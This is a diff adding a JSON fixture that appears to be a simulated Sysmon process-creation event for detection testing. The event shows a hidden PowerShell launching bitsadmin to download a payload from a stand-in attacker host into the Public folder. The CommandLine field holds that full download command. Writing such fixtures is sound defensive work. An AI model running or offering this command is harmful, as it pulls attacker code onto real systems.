@@ -1,0 +1,11 @@
+{
+  "_comment": "bitsadmin transfer job pulling a payload over HTTPS into Public",
+  "EventID": 1,
+  "UtcTime": "2026-07-14 11:44:36.518",
+  "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+  "CommandLine": "bitsadmin /transfer debugjob /download /priority high https://cdn.evil-updates.example/p.bin C:\\Users\\Public\\p.bin",
+  "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "ParentCommandLine": "powershell -w hidden",
+  "User": "CORP\\jdoe",
+  "IntegrityLevel": "Medium"
+}
